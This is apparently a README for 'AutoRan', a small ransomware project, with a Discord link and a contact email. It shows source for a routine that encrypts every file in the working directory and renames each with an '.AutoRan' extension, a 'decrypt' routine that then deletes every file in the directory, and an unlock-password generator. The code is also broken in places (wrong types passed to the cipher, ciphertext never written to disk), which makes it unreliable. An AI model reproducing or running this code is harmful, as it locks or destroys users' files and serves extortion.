# AutoRan
## Help
Dev Discord : https://discord.gg/nhNWu8Sjre

Gmail : blacktechasdf@gmail.com
### AutoRan history 1.0
#### Encrypt
###### Encrypt Source Code

```
from cryptography.fernet import Fernet

Encrypt = {}
Files = glob.glob("*.*")

Key = Fernet.generate_key()
F = Fernet(Key)

def Encry():
  try:
    for File in Files:
      with open(File, "r") as fp:
        Data = fp.read()
        Locked = F.encrypt(Data)
        Encrypt[File] = Locked
        os.rename(File, f"{File}.AutoRan")
        FL.insert(END, f"{File} -> {File}.AutoRan")
        fp.close()
  except:
    pass
```

#### Decrypt
##### Decrypt Source Code

```
( Encrypt Source Code )

def Decry():
  try:
    for LockData in Encrypt:
      with open(LockData, "w") as fp:
        Data = Encrypt[LockData]
        UnLocked = F.decrypt(Data).decode()
        fp.write(UnLocked)
      os.rename(f"{LockData}.AutoRan", LockData)
      for file in os.listdir():
        os.remove(file)
  except:
    pass
```

#### Password Generate
##### Password Generate Source Code
```
Password = ""

for i in range(0, 8):
  Password = Password+"x"+random.randrange(10, 100)
```

#### Use cryptography.fernet
